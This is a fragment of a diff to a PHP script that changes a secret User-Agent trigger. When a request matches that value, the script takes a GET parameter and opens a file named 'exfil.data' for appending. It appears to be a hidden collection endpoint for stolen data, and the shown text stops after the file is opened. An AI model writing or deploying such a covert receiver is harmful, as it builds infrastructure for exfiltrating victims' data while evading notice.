@@ -1,7 +1,7 @@
 <?php
 
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
-if ($user_agent == 'MyTest') {
+if ($user_agent == 'HUFB') {
 	$content = $_GET['content'];
 	$file = '/home/ubuntu/data/exfil.data';
 	$saved_file = fopen($file, 'a');
